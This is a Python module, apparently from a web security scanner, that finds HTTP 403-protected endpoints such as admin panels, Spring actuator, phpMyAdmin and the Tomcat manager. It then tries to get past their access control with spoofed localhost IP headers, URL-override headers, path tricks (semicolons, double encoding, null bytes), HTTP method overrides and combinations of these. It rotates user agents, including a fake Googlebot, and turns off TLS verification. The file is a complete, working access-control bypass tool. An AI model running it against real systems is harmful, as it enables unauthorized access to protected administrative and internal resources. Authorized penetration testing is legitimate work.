# modules/bypass_403.py
import re
import time
import random
import hashlib
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Bypass technique catalogue
# ---------------------------------------------------------------------------
#
# Techniques are grouped into four families:
#   HEADER   — inject or spoof headers that influence routing/ACL decisions
#   PATH     — manipulate the URL path to confuse access control middleware
#   METHOD   — override or change the HTTP method
#   ENCODING — percent-encode or unicode-normalise the path differently
# ---------------------------------------------------------------------------

# (header_name, header_value, label)
_HEADER_BYPASSES: List[Tuple[str, str, str]] = [
    # IP spoofing — WAF/CDN may trust these over the real source IP
    ("X-Forwarded-For",        "127.0.0.1",          "XFF-localhost"),
    ("X-Forwarded-For",        "127.0.0.1, 127.0.0.1","XFF-double"),
    ("X-Forwarded-For",        "0.0.0.0",             "XFF-zero"),
    ("X-Forwarded-For",        "::1",                 "XFF-ipv6-lo"),
    ("X-Forwarded-For",        "10.0.0.1",            "XFF-rfc1918-10"),
    ("X-Forwarded-For",        "192.168.1.1",         "XFF-rfc1918-192"),
    ("X-Forwarded-For",        "172.16.0.1",          "XFF-rfc1918-172"),
    ("X-Real-IP",              "127.0.0.1",           "X-Real-IP-lo"),
    ("X-Real-IP",              "0.0.0.0",             "X-Real-IP-zero"),
    ("X-Remote-IP",            "127.0.0.1",           "X-Remote-IP"),
    ("X-Remote-Addr",          "127.0.0.1",           "X-Remote-Addr"),
    ("X-Client-IP",            "127.0.0.1",           "X-Client-IP"),
    ("X-Host",                 "127.0.0.1",           "X-Host-lo"),
    ("X-Custom-IP-Authorization", "127.0.0.1",        "X-Custom-IP-Auth"),
    ("CF-Connecting-IP",       "127.0.0.1",           "CF-Connecting-IP"),
    ("True-Client-IP",         "127.0.0.1",           "True-Client-IP"),
    ("Forwarded",              "for=127.0.0.1",       "Forwarded-lo"),
    ("Forwarded",              "for=\"[::1]\"",       "Forwarded-ipv6"),
    ("X-ProxyUser-Ip",         "127.0.0.1",           "X-ProxyUser-Ip"),
    ("Via",                    "1.1 127.0.0.1",       "Via-lo"),
    ("Client-IP",              "127.0.0.1",           "Client-IP"),

    # URL/path override — some reverse proxies rewrite the path from these
    ("X-Original-URL",         "{path}",              "X-Original-URL"),
    ("X-Rewrite-URL",          "{path}",              "X-Rewrite-URL"),
    ("X-Override-URL",         "{path}",              "X-Override-URL"),
    ("X-Forwarded-Path",       "{path}",              "X-Forwarded-Path"),
    ("Referer",                "https://127.0.0.1{path}", "Referer-lo"),

    # Content-type negotiation tricks
    ("Content-Type",           "application/json",    "CT-json"),
    ("Accept",                 "application/json",    "Accept-json"),

    # Misc routing headers
    ("X-Backend-Server",       "127.0.0.1",           "X-Backend-Server"),
    ("X-Internal",             "1",                   "X-Internal"),
    ("X-Forwarded-Host",       "localhost",            "X-Fwd-Host-lo"),
    ("X-Forwarded-Proto",      "https",               "X-Fwd-Proto-https"),
    ("X-Original-Host",        "localhost",            "X-Original-Host"),
]

# Path-level tricks applied to the blocked path
# {path} is substituted with the original path at probe time
_PATH_BYPASSES: List[Tuple[str, str]] = [
    # Dot-segment tricks
    ("{path}/.",                    "trailing-dot-slash"),
    ("{path}//",                    "double-slash-trail"),
    ("//{path}",                    "double-slash-lead"),
    ("/{path}",                     "ensure-leading-slash"),
    ("{path}?",                     "empty-query"),
    ("{path}#",                     "empty-fragment"),
    ("{path}?anything=1",           "dummy-param"),
    ("{path}/../{leaf}",            "dotdot-leaf"),
    ("{path}/..;/",                 "dotdot-semicolon"),
    ("{path}/./",                   "single-dot"),

    # Semicolon path parameter (Java/Tomcat)
    (";/{path}",                    "semicolon-prefix"),
    ("{path};/",                    "semicolon-suffix"),
    ("{path};random=1",             "semicolon-param"),
    ("{dir};x=y/{leaf}",            "semicolon-dir-param"),

    # Mixed case — bypasses case-sensitive ACL on case-insensitive FS
    ("{PATH_UPPER}",                "uppercase"),
    ("{PATH_MIXED}",                "mixedcase"),

    # URL-encoded variants
    ("{path_encoded_once}",         "url-encode-once"),
    ("{path_encoded_twice}",        "url-encode-twice"),
    ("{path_unicode}",              "unicode-slash"),

    # Null byte (some parsers truncate at %00)
    ("{path}%00",                   "null-byte"),
    ("{path}%00.html",              "null-byte-html"),

    # Extension confusion
    ("{path}.json",                 "ext-json"),
    ("{path}.html",                 "ext-html"),
    ("{path}.php",                  "ext-php"),
    ("{path}.asp",                  "ext-asp"),

    # Trailing special chars
    ("{path}%20",                   "trailing-space"),
    ("{path}%09",                   "trailing-tab"),
    ("{path}%0a",                   "trailing-newline"),
    ("{path}%0d",                   "trailing-cr"),
    ("{path}~",                     "trailing-tilde"),
]

# HTTP method overrides
_METHOD_BYPASSES: List[Tuple[str, str, str]] = [
    # (method, extra_header_name, extra_header_value)
    ("POST",    "X-HTTP-Method-Override",   "GET"),
    ("POST",    "X-Method-Override",        "GET"),
    ("POST",    "_method",                  "GET"),        # form-based override
    ("GET",     "X-HTTP-Method",            "PATCH"),
    ("GET",     "X-HTTP-Method",            "PUT"),
    ("GET",     "X-HTTP-Method",            "DELETE"),
    ("HEAD",    "",                         ""),
    ("OPTIONS", "",                         ""),
    ("TRACE",   "",                         ""),
    ("CONNECT", "",                         ""),
    ("PUT",     "",                         ""),
    ("PATCH",   "",                         ""),
    ("FAKE",    "",                         ""),           # unknown method — some proxies pass through
]

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.7.1",
]


def _ua() -> str:
    return random.choice(_UA_POOL)


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=1, backoff_factor=0.2, status_forcelist=[])
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=25,
        pool_maxsize=50,
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class BypassResult:
    url: str                  # exact URL probed
    original_path: str
    technique_family: str     # header / path / method / encoding
    technique_label: str      # human-readable label for this variant
    method: str
    injected_header: Optional[str]
    injected_value: Optional[str]
    status: int
    content_length: int
    content_type: Optional[str]
    body_hash: str
    title: Optional[str]
    redirect_to: Optional[str]
    bypassed: bool            # True when server returned non-403 / non-401


@dataclass
class TargetProfile:
    """Pre-scan profile of a 403 endpoint."""
    url: str
    path: str
    base_url: str
    original_status: int
    original_length: int
    original_hash: str


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.I | re.S)


def _extract_title(html: str) -> Optional[str]:
    m = _TITLE_RE.search(html)
    if m:
        return re.sub(r"\s+", " ", m.group(1)).strip()[:100]
    return None


def _body_hash(content: bytes) -> str:
    return hashlib.md5(content).hexdigest()


def _is_bypass(status: int, body_hash: str, profile: TargetProfile) -> bool:
    """
    A bypass is confirmed when:
      - status is not 403 / 401 / 404 / 410
      - AND the body differs from the original blocked response
        (guards against servers returning 200 for every request with identical body)
    """
    if status in (401, 403, 404, 410, 429):
        return False
    if body_hash == profile.original_hash:
        return False
    return True


def _path_mutations(path: str) -> Dict[str, str]:
    """
    Pre-compute all named path substitutions for _PATH_BYPASSES.
    Returns a dict of placeholder → computed value.
    """
    # Ensure path starts with /
    if not path.startswith("/"):
        path = "/" + path

    parts = path.rsplit("/", 1)
    directory = parts[0] or "/"
    leaf = parts[1] if len(parts) > 1 else ""

    encoded_once = urllib.parse.quote(path, safe="")
    encoded_twice = urllib.parse.quote(encoded_once, safe="")
    # Unicode full-width slash U+FF0F
    unicode_path = path.replace("/", "\uff0f")

    return {
        "{path}":               path,
        "{leaf}":               leaf,
        "{dir}":                directory,
        "{PATH_UPPER}":         path.upper(),
        "{PATH_MIXED}":         "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(path)
        ),
        "{path_encoded_once}":  encoded_once,
        "{path_encoded_twice}": encoded_twice,
        "{path_unicode}":       unicode_path,
        "{dir}":                directory,
    }


def _resolve_path_template(template: str, mutations: Dict[str, str]) -> str:
    result = template
    for placeholder, value in mutations.items():
        result = result.replace(placeholder, value)
    return result


# ---------------------------------------------------------------------------
# Probe workers — one per technique family
# ---------------------------------------------------------------------------

def _probe_request(
    session: requests.Session,
    url: str,
    method: str,
    extra_headers: Dict[str, str],
    timeout: float,
    rate_delay: float,
    profile: TargetProfile,
    technique_family: str,
    technique_label: str,
    injected_header: Optional[str],
    injected_value: Optional[str],
    original_path: str,
) -> Optional[BypassResult]:
    """Generic probe — called by all technique families."""
    if rate_delay > 0:
        time.sleep(rate_delay)

    headers = {"User-Agent": _ua(), **extra_headers}
    try:
        resp = session.request(
            method,
            url,
            headers=headers,
            timeout=timeout,
            allow_redirects=False,
        )
    except requests.RequestException:
        return None

    content = resp.content
    bh = _body_hash(content)
    ct = resp.headers.get("Content-Type", "").split(";")[0].strip() or None
    title = _extract_title(resp.text) if resp.text else None
    redirect_to = resp.headers.get("Location") if resp.status_code in (
        301, 302, 303, 307, 308) else None
    bypassed = _is_bypass(resp.status_code, bh, profile)

    return BypassResult(
        url=url,
        original_path=original_path,
        technique_family=technique_family,
        technique_label=technique_label,
        method=method,
        injected_header=injected_header,
        injected_value=injected_value,
        status=resp.status_code,
        content_length=len(content),
        content_type=ct,
        body_hash=bh,
        title=title,
        redirect_to=redirect_to,
        bypassed=bypassed,
    )


def _header_probe_tasks(
    session: requests.Session,
    profile: TargetProfile,
    timeout: float,
    rate_delay: float,
) -> List[BypassResult]:
    """Enumerate all header-based bypass variants for one target."""
    results: List[BypassResult] = []
    for header_name, header_value, label in _HEADER_BYPASSES:
        # Substitute {path} in header value
        value = header_value.replace("{path}", profile.path)
        r = _probe_request(
            session=session,
            url=profile.url,
            method="GET",
            extra_headers={header_name: value},
            timeout=timeout,
            rate_delay=rate_delay,
            profile=profile,
            technique_family="header",
            technique_label=label,
            injected_header=header_name,
            injected_value=value,
            original_path=profile.path,
        )
        if r:
            results.append(r)
    return results


def _path_probe_tasks(
    session: requests.Session,
    profile: TargetProfile,
    timeout: float,
    rate_delay: float,
) -> List[BypassResult]:
    """Enumerate all path-manipulation variants for one target."""
    results: List[BypassResult] = []
    mutations = _path_mutations(profile.path)

    for template, label in _PATH_BYPASSES:
        mutated_path = _resolve_path_template(template, mutations)
        # Build the full URL by replacing only the path component
        parsed = urllib.parse.urlparse(profile.url)
        url = urllib.parse.urlunparse(parsed._replace(path=mutated_path, query=""))
        r = _probe_request(
            session=session,
            url=url,
            method="GET",
            extra_headers={},
            timeout=timeout,
            rate_delay=rate_delay,
            profile=profile,
            technique_family="path",
            technique_label=label,
            injected_header=None,
            injected_value=mutated_path,
            original_path=profile.path,
        )
        if r:
            results.append(r)
    return results


def _method_probe_tasks(
    session: requests.Session,
    profile: TargetProfile,
    timeout: float,
    rate_delay: float,
) -> List[BypassResult]:
    """Enumerate HTTP method override variants."""
    results: List[BypassResult] = []
    for method, override_header, override_value in _METHOD_BYPASSES:
        extra: Dict[str, str] = {}
        label = f"method-{method}"
        if override_header:
            extra[override_header] = override_value
            label += f"+{override_header}"
        r = _probe_request(
            session=session,
            url=profile.url,
            method=method,
            extra_headers=extra,
            timeout=timeout,
            rate_delay=rate_delay,
            profile=profile,
            technique_family="method",
            technique_label=label,
            injected_header=override_header or None,
            injected_value=override_value or None,
            original_path=profile.path,
        )
        if r:
            results.append(r)
    return results


def _combined_probe_tasks(
    session: requests.Session,
    profile: TargetProfile,
    timeout: float,
    rate_delay: float,
) -> List[BypassResult]:
    """
    High-value combined probes: stack a header bypass on top of a path trick.
    Covers cases where either alone fails but both together succeed.
    Only the most impactful combinations are tested to avoid explosion.
    """
    results: List[BypassResult] = []
    mutations = _path_mutations(profile.path)

    # Top header bypasses to stack
    top_headers = [
        ("X-Forwarded-For",  "127.0.0.1"),
        ("X-Original-URL",   profile.path),
        ("X-Rewrite-URL",    profile.path),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
    ]

    # Top path tricks to stack
    top_paths = [
        (profile.path + "/.",      "combo-dot"),
        (profile.path + "//",      "combo-dbl-slash"),
        ("/" + profile.path,       "combo-slash-prefix"),
        (profile.path + ";/",      "combo-semicolon"),
        (profile.path + "%20",     "combo-space"),
    ]

    for h_name, h_val in top_headers:
        for mutated_path, path_label in top_paths:
            parsed = urllib.parse.urlparse(profile.url)
            url = urllib.parse.urlunparse(parsed._replace(path=mutated_path, query=""))
            label = f"combo:{h_name}+{path_label}"
            r = _probe_request(
                session=session,
                url=url,
                method="GET",
                extra_headers={h_name: h_val},
                timeout=timeout,
                rate_delay=rate_delay,
                profile=profile,
                technique_family="combined",
                technique_label=label,
                injected_header=h_name,
                injected_value=h_val,
                original_path=profile.path,
            )
            if r:
                results.append(r)

    return results


# ---------------------------------------------------------------------------
# Target discovery — find 403 endpoints to test
# ---------------------------------------------------------------------------

_COMMON_PROBE_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin/dashboard",
    "/api", "/api/v1", "/api/v2", "/api/users", "/api/admin",
    "/console", "/dashboard", "/panel", "/portal",
    "/config", "/settings", "/setup", "/install",
    "/backup", "/logs", "/debug", "/test",
    "/private", "/internal", "/secret", "/hidden",
    "/phpMyAdmin", "/phpmyadmin", "/adminer",
    "/server-status", "/server-info",
    "/actuator", "/actuator/env", "/actuator/beans",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/manager", "/manager/html",        # Tomcat manager
    "/jmx-console", "/web-console",     # JBoss
]


def _discover_403_targets(
    session: requests.Session,
    base_url: str,
    extra_paths: List[str],
    timeout: float,
) -> List[TargetProfile]:
    """
    Probe common paths to find 403 endpoints.
    Returns a TargetProfile for each confirmed 403.
    """
    profiles: List[TargetProfile] = []
    all_paths = list(dict.fromkeys(_COMMON_PROBE_PATHS + extra_paths))

    def _probe_path(path: str) -> Optional[TargetProfile]:
        url = base_url.rstrip("/") + path
        try:
            resp = session.get(
                url,
                headers={"User-Agent": _ua()},
                timeout=timeout,
                allow_redirects=False,
            )
            if resp.status_code == 403:
                return TargetProfile(
                    url=url,
                    path=path,
                    base_url=base_url,
                    original_status=403,
                    original_length=len(resp.content),
                    original_hash=_body_hash(resp.content),
                )
        except requests.RequestException:
            pass
        return None

    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = {ex.submit(_probe_path, p): p for p in all_paths}
        for f in as_completed(futures):
            r = f.result()
            if r:
                profiles.append(r)
                print(f"[bypass_403] found 403 → {r.url}")

    return profiles


# ---------------------------------------------------------------------------
# Deduplication
# ---------------------------------------------------------------------------

def _dedup_bypasses(results: List[BypassResult]) -> List[BypassResult]:
    """
    Deduplicate by (original_path, status, body_hash).
    When multiple techniques achieve the same bypass, keep the simplest one
    (shortest technique_label) to surface the most actionable result first.
    """
    # Group by key
    groups: Dict[Tuple, List[BypassResult]] = {}
    for r in results:
        key = (r.original_path, r.status, r.body_hash)
        groups.setdefault(key, []).append(r)

    unique: List[BypassResult] = []
    for group in groups.values():
        # Prefer bypassed=True, then shortest label
        group.sort(key=lambda x: (0 if x.bypassed else 1, len(x.technique_label)))
        unique.append(group[0])

    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class Bypass403Scanner:
    """
    403 Forbidden bypass scanner.

    Discovers 403-protected endpoints on the target, then systematically
    attempts header injection, path manipulation, HTTP method override,
    and combined technique stacking to bypass access control.

    Usage in app.py:
        scanner = Bypass403Scanner(target_url=f"https://{domain}")
        results = scanner.scan()
        scan_results[scan_id]['bypass_403'] = results
    """

    def __init__(
        self,
        target_url: str,
        extra_paths: Optional[List[str]] = None,
        known_403_urls: Optional[List[str]] = None,
        timeout: float = 7.0,
        max_workers: int = 20,
        rate_delay: float = 0.0,
        proxy: Optional[str] = None,
    ):
        self.target_url = target_url.rstrip("/")
        self.extra_paths = extra_paths or []
        # Caller may pass in already-known 403 URLs (from other modules)
        self.known_403_urls = known_403_urls or []
        self.timeout = timeout
        self.max_workers = max_workers
        self.rate_delay = rate_delay
        self.proxy = proxy

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _build_profiles(
        self, session: requests.Session
    ) -> List[TargetProfile]:
        profiles = _discover_403_targets(
            session, self.target_url, self.extra_paths, self.timeout
        )

        # Add caller-supplied known-403 URLs
        seen_urls: Set[str] = {p.url for p in profiles}
        for url in self.known_403_urls:
            if url in seen_urls:
                continue
            parsed = urllib.parse.urlparse(url)
            path = parsed.path or "/"
            try:
                resp = session.get(
                    url,
                    headers={"User-Agent": _ua()},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                profiles.append(TargetProfile(
                    url=url,
                    path=path,
                    base_url=self.target_url,
                    original_status=resp.status_code,
                    original_length=len(resp.content),
                    original_hash=_body_hash(resp.content),
                ))
                seen_urls.add(url)
            except requests.RequestException:
                pass

        return profiles

    def _run_all_techniques(
        self,
        session: requests.Session,
        profiles: List[TargetProfile],
    ) -> List[BypassResult]:
        all_results: List[BypassResult] = []
        lock = threading.Lock()

        # Build flat task list: (probe_fn, profile)
        Task = Tuple  # (callable, TargetProfile)
        tasks: List[Tuple] = []
        for profile in profiles:
            tasks.append((_header_probe_tasks,   profile))
            tasks.append((_path_probe_tasks,     profile))
            tasks.append((_method_probe_tasks,   profile))
            tasks.append((_combined_probe_tasks, profile))

        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {
                ex.submit(fn, session, profile, self.timeout, self.rate_delay): (fn.__name__, profile.path)
                for fn, profile in tasks
            }
            for future in as_completed(futures):
                fn_name, path = futures[future]
                try:
                    batch = future.result()
                except Exception as exc:
                    print(f"[bypass_403] {fn_name} on {path} raised: {exc}")
                    continue
                bypasses = [r for r in batch if r.bypassed]
                with lock:
                    all_results.extend(batch)
                for r in bypasses:
                    print(
                        f"  [BYPASS][{r.status}][{r.technique_family.upper():<8}] "
                        f"{r.url}  via {r.technique_label}"
                    )

        return all_results

    # ------------------------------------------------------------------
    # Public
    # ------------------------------------------------------------------

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        session = _build_session(self.proxy)

        print(f"[bypass_403] target  : {self.target_url}")

        profiles = self._build_profiles(session)
        if not profiles:
            print("[bypass_403] no 403 endpoints found — nothing to bypass")
            return {
                "target": self.target_url,
                "targets_found": 0,
                "total_probes": 0,
                "bypasses_found": 0,
                "results": [],
            }

        print(f"[bypass_403] targets : {len(profiles)}")

        all_results = self._run_all_techniques(session, profiles)
        all_results = _dedup_bypasses(all_results)

        # Split into bypassed / non-bypassed
        bypassed  = [r for r in all_results if r.bypassed]
        attempted = [r for r in all_results if not r.bypassed]

        # Sort bypassed: by family priority then label
        family_order = {"combined": 0, "header": 1, "path": 2, "method": 3}
        bypassed.sort(key=lambda r: (family_order.get(r.technique_family, 9), r.technique_label))

        # Summary by technique family
        family_counts: Dict[str, int] = {}
        for r in bypassed:
            family_counts[r.technique_family] = family_counts.get(r.technique_family, 0) + 1

        total_probes = (
            len(profiles) * (
                len(_HEADER_BYPASSES) +
                len(_PATH_BYPASSES) +
                len(_METHOD_BYPASSES) +
                len([1 for _ in range(4 * 5)])  # combined top combinations
            )
        )

        return {
            "target": self.target_url,
            "targets_found": len(profiles),
            "protected_paths": [p.path for p in profiles],
            "total_probes": total_probes,
            "bypasses_found": len(bypassed),
            "bypass_by_family": family_counts,
            "results": [self._serialize(r) for r in bypassed + attempted],
        }

    @staticmethod
    def _serialize(r: BypassResult) -> Dict:
        return {
            "url": r.url,
            "original_path": r.original_path,
            "technique_family": r.technique_family,
            "technique_label": r.technique_label,
            "method": r.method,
            "injected_header": r.injected_header,
            "injected_value": r.injected_value,
            "status": r.status,
            "content_length": r.content_length,
            "content_type": r.content_type,
            "title": r.title,
            "redirect_to": r.redirect_to,
            "bypassed": r.bypassed,
        }